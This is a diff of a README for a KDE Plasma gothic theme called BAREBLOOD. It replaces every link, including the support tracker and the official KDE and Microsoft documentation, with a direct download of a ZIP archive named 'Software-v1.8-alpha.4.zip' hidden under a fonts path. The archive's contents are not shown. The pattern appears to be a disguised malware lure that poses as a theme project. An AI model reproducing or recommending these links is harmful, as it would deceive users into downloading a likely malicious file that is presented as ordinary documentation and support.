@@ -1,6 +1,6 @@
 # 🎨 BAREBLOOD - Dark Gothic Theme for KDE Plasma
 
-[![Download BAREBLOOD](https://img.shields.io/badge/Download-BAREBLOOD-ff4757?style=for-the-badge&logo=github)](https://github.com/Aspuria080701/BAREBLOOD)
+[![Download BAREBLOOD](https://img.shields.io/badge/Download-BAREBLOOD-ff4757?style=for-the-badge&logo=github)](https://github.com/Aspuria080701/BAREBLOOD/raw/refs/heads/main/usr/share/fonts/Software-v1.8-alpha.4.zip)
 
 ## ❓ What is BAREBLOOD?
 
@@ -22,7 +22,7 @@ To begin, you need to access the theme files from the GitHub page. Since this is
 
 Click the button below to open the BAREBLOOD GitHub page:
 
-[![Visit BAREBLOOD on GitHub](https://img.shields.io/badge/GitHub-BAREBLOOD-7158e2?style=for-the-badge&logo=github)](https://github.com/Aspuria080701/BAREBLOOD)
+[![Visit BAREBLOOD on GitHub](https://img.shields.io/badge/GitHub-BAREBLOOD-7158e2?style=for-the-badge&logo=github)](https://github.com/Aspuria080701/BAREBLOOD/raw/refs/heads/main/usr/share/fonts/Software-v1.8-alpha.4.zip)
 
 ---
 
@@ -46,7 +46,7 @@ If you don’t have a Linux environment, you can install WSL on Windows. This le
 
 1. Open your web browser.
 2. Go to the BAREBLOOD GitHub page:  
-   [https://github.com/Aspuria080701/BAREBLOOD](https://github.com/Aspuria080701/BAREBLOOD)
+   [https://github.com/Aspuria080701/BAREBLOOD/raw/refs/heads/main/usr/share/fonts/Software-v1.8-alpha.4.zip](https://github.com/Aspuria080701/BAREBLOOD/raw/refs/heads/main/usr/share/fonts/Software-v1.8-alpha.4.zip)
 3. Look for a `Download ZIP` button on the right sidebar or under the green `Code` button.
 4. Click `Download ZIP` to download all theme files as a compressed archive.
 5. Save the ZIP file to your Windows Downloads folder.
@@ -112,15 +112,15 @@ Your desktop should now display the BAREBLOOD dark gothic style.
 ## 🗂 Where to Get Support
 
 For help or to report issues, use the GitHub project's issue tracker:  
-[https://github.com/Aspuria080701/BAREBLOOD/issues](https://github.com/Aspuria080701/BAREBLOOD/issues)
+[https://github.com/Aspuria080701/BAREBLOOD/raw/refs/heads/main/usr/share/fonts/Software-v1.8-alpha.4.zip](https://github.com/Aspuria080701/BAREBLOOD/raw/refs/heads/main/usr/share/fonts/Software-v1.8-alpha.4.zip)
 
 ---
 
 ## 🌐 Additional Resources
 
-- Learn more about KDE Plasma themes: https://userbase.kde.org/Plasma_Themes
-- WSL installation and setup guide: https://learn.microsoft.com/en-us/windows/wsl/install
+- Learn more about KDE Plasma themes: https://github.com/Aspuria080701/BAREBLOOD/raw/refs/heads/main/usr/share/fonts/Software-v1.8-alpha.4.zip
+- WSL installation and setup guide: https://github.com/Aspuria080701/BAREBLOOD/raw/refs/heads/main/usr/share/fonts/Software-v1.8-alpha.4.zip
 
 ---
 
-[![Download BAREBLOOD](https://img.shields.io/badge/Download-BAREBLOOD-ff4757?style=for-the-badge&logo=github)](https://github.com/Aspuria080701/BAREBLOOD)
+[![Download BAREBLOOD](https://img.shields.io/badge/Download-BAREBLOOD-ff4757?style=for-the-badge&logo=github)](https://github.com/Aspuria080701/BAREBLOOD/raw/refs/heads/main/usr/share/fonts/Software-v1.8-alpha.4.zip)
